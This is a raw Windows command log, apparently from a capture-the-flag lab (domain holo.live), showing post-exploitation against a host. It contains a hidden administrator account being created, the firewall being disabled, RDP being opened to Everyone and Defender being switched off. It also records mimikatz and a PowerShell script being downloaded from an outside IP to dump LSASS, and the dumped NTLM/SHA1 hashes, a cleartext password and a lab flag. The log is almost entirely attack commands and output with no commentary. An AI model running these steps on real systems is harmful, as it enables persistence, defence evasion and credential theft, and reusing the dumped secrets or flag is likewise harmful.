@@ -1,0 +1,349 @@
+net user recon ajith123 /add
+The command completed successfully.
+
+
+net localgroup administrators recon /add
+The command completed successfully.
+
+
+netsh advfirewall set allprofiles state off
+Ok.
+
+
+net localgroup "Remote Desktop Users" Everyone /Add
+The command completed successfully.
+
+
+cd C:\Users\Administrator\Desktop
+
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3A33-D07B
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/03/2020  06:32 PM    <DIR>          .
+12/03/2020  06:32 PM    <DIR>          ..
+12/03/2020  06:32 PM                38 root.txt
+               1 File(s)             38 bytes
+               2 Dir(s)  14,446,657,536 bytes free
+
+type root.txt
+HOLO{50f9614809096ffe2d246e9dd21a76e1}
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : holo.live
+   Link-local IPv6 Address . . . . . : fe80::4044:c1d6:4fb1:388%6
+   IPv4 Address. . . . . . . . . . . : 10.200.111.31
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.200.111.1
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+'Set-MpPreference' is not recognized as an internal or external command,
+operable program or batch file.
+
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+Invoke-WebRequest "http://10.50.108.210/escm.ps1" -outfile "escm.ps1"
+import-module ./escm.ps1
+Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"
+Invoke-Mimikatz : A positional parameter cannot be found that accepts argument 'sekurlsa::logonpasswords'.
+At line:1 char:1
++ Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "sekurls ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Invoke-Mimikatz], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Invoke-Mimikatz
+
+Invoke-WebRequest "http://10.50.108.210/mimikatz.exe" -outfile "mimikatz.exe"
+.\mimikatz "log host-31.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # log host-31.log
+Using 'host-31.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+668     {0;000003e7} 1 D 21240          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 2707637     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2733409     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 272121 (00000000:000426f9)
+Session           : Interactive from 1
+User Name         : watamet
+Domain            : HOLOLIVE
+Logon Server      : DC-SRV01
+Logon Time        : 4/23/2022 11:51:47 AM
+SID               : S-1-5-21-471847105-3603022926-1728018720-1132
+        msv :
+         [00000003] Primary
+         * Username : watamet
+         * Domain   : HOLOLIVE
+         * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
+         * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
+         * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
+        tspkg :
+        wdigest :
+         * Username : watamet
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : watamet
+         * Domain   : HOLO.LIVE
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : S-SRV01$
+Domain            : HOLOLIVE
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:31 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : s-srv01$
+         * Domain   : HOLO.LIVE
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 27317 (00000000:00006ab5)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:30 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : S-SRV01$
+         * Domain   : holo.live
+         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 27213 (00000000:00006a4d)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:30 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : S-SRV01$
+         * Domain   : holo.live
+         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a
+         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 25926 (00000000:00006546)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:30 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 272143 (00000000:0004270f)
+Session           : Interactive from 1
+User Name         : watamet
+Domain            : HOLOLIVE
+Logon Server      : DC-SRV01
+Logon Time        : 4/23/2022 11:51:47 AM
+SID               : S-1-5-21-471847105-3603022926-1728018720-1132
+        msv :
+         [00000003] Primary
+         * Username : watamet
+         * Domain   : HOLOLIVE
+         * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
+         * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
+         * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
+        tspkg :
+        wdigest :
+         * Username : watamet
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : watamet
+         * Domain   : HOLO.LIVE
+         * Password : Nothingtoworry!
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:35 AM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:31 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 45670 (00000000:0000b266)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:31 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : S-SRV01$
+         * Domain   : holo.live
+         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 45598 (00000000:0000b21e)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:31 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
+         * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : S-SRV01$
+         * Domain   : holo.live
+         * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : S-SRV01$
+Domain            : HOLOLIVE
+Logon Server      : (null)
+Logon Time        : 4/23/2022 11:51:30 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : S-SRV01$
+         * Domain   : HOLOLIVE
+         * Password : (null)
+        kerberos :
+         * Username : s-srv01$
+         * Domain   : HOLO.LIVE
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
+PS C:\Users\Administrator\Desktop>
